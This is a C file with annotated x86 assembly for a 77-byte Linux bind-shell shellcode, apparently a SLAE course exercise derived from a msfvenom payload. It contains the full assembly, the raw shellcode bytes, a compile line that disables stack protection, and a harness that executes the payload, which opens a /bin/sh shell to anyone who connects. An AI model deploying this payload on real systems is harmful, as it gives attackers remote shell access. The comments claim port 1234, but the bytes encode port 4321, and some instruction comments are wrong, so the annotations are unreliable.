/*
;Linux x86 bind shell port 1234
;Auther: H4554n AlMusajjen
;Tested on i686 GNU/Linux
;Shellcode Length is:77
;SLAE - 1057
;Date: 11/21/2017
;Bind Port   : 1234
;Description : A linux/x86 bind shell via /bin/sh. Created by analysing msfvenom;
;          original payload was 78 bytes. My shellcode
;          is 77 containing 0 NULLS.

Original Metasploit Shellcode:
    sudo msfvenom -p linux/x86/shell_bind_tcp lport=1234 -b "\x00" -f c --smallest -i 0

Test using:
    gcc -fno-stack-protector -z execstack shellcode.c

global _start

section .text

_start:
        ; int socketcall(int call, unsigned long *args) remember to place backwards!
	xor ebx,ebx	;setting ebx to zero
	push 0x66
	pop eax		;syscall for socketcall()
	cdq 		;setting edx to zero
	push ebx	;pushing EBX into stack (IPPROTO_IP = 0)
	inc ebx		;Incrementing EBX by 1
	push ebx	;Pushing EBX into stack (SOCK_STREAM = 1)
	push 2		;Push 2 into stack (AF_INET = 2)
	mov ecx, esp	;top of stack contains our arguments save address in ECX
	int 80h		;call the kernal

  ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
        pop ebx                 ; POP stack(2 = SYS_BIND = bind()) into EBX
        pop esi                 ; POP stack(1) into ESI we dont need it
        push edx                ; PUSH EDX(0) into the stack (INADDR_ANY = 0)
        push word 0xd204        ; PUSH 0xd204 into the stack (PORT:1234) "don't forget to make it backward"
        push edx                ; PUSH 00 into the stack
        push byte 0x02          ; PUSH 02 into the stack (AF_INET = 2)
        push 0x10               ; PUSH 16 into the stack (ADDRLEN = 16)
        push ecx                ; PUSH ECX(struct pointer) into the stack
        push eax                ; PUSH EAX(socket file descriptor) into stack
        mov ecx,esp             ; top of stack contains our argument array save it in ECX
        mov al,0x66              ; system call for socketcall() 0x66
        int 80h                 ; call that kernel

        ; int listen(int sockfd, int backlog)
        mov [ecx+4],eax         ; zero out [ECX+4]
        mov bl,4                ; MOV (4 = SYS_LISTEN = listen()) into BL
        mov al,0x66              ; make system call for socketcall()
        int 80h                 ; call the kernel

        ; accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
        inc ebx                 ; EBX(5) = SYS_ACCEPT = accept()
        mov al,0x66              ; make system call for socketcall() 0x66
        int 80h                 ; call the kernel!!
 
        xchg eax,ebx            ; Put socket descriptor in EBX and 0x5 in EAX
        pop ecx                 ; POP 3 into ECX for counter to be used in loop
 
loop:
        ; int dup2(int oldfd, int newfd)
        mov al,63               ; syscall for dup2()
        int 80h                 ; call the kernel!!
        dec ecx                 ; count down to zero
        jns loop                ; If SF is not set, then, ECX is not negative so continue looping
 
done:
        ; int execve(const char *filename, char *const argv[], char *const envp[])
        push dword 0x68732f2f   ; PUSH hs// into stack
        push dword 0x6e69622f   ; PUSH nib/ into stack
        mov ebx,esp             ; put the address of "/bin//sh" into EBX via ESP
        push eax                ; PUSH nulls for string termination
        mov ecx,esp             ; store argv array into ECX via the stack or ESP
        mov al,11               ; make execve() systemcall or 11
        int 80h                 ; call the kernel

*/
#include<stdio.h>
#include<string.h>


unsigned char code[] = \
"\x31\xdb\x6a\x66\x58\x99\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68\x10\xe1\x52\x6a\x02\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe1\xb0\x0b\xcd\x80";
int main()
{

printf("Shellcode Length:  %d\n", (int)strlen(code));

int (*ret)() = (int(*)())code;

ret();

}
